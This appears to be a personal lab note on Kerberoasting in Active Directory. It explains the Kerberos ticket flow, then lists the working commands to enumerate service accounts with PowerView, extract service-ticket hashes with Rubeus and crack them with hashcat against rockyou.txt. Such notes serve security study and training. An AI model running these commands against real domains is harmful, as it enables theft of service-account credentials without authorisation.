# Classic Kerberoast

This is a technique that abuses the way Kerberos works. 

## Kerberos Rundown

1. User requests a TGT by sending a timestamp encrypted with their credentials to the DC (KDC/Key Distribution Center)
2. KDC validates the authentication, and replies with a TGT.
3. When the user needs access to a service, they send the TGT to the TGS (Ticket Granting Service) server. 
4. The TGS server receives the TGT ticket and replies with a TGS ticket for the service the user is requesting.
5. The user sends that TGS ticket to the application for services.

## The weakness

In step 4, the TGS ticket that the user receives is encrypted with the hash of the service account running the service. This means, any valid user can take the TGS ticket and attempt to crack the hash offline.

## Kerberoast in Action

SPN or Service Principal Name, is a property that gets added to user objects when they run a service.

PowerView can be used to see all SPN accounts.

Get-NetUser -SPN | select cn

![[Pasted image 20210907105023.png]]

The "SQL Service" account looks interesting. 

The Request-SPN cmdlet allows me to request the TGS ticket for the SQLService

Request-SPN

![[Pasted image 20210907110004.png]]

We can see the TGS ticket with "klist"

I used Rubeus.exe to pull the sqlhash

.\Rubeus.exe kerberoast /outfile c:\ad\tools\working\kerberoast.txt

![[Pasted image 20210907112609.png]]

![[Pasted image 20210907112620.png]]

This hash can then be cracked with hashcat

hashcat64.exe -m 13100 hash.txt rockyou.txt -O

![[Pasted image 20210907113238.png]]

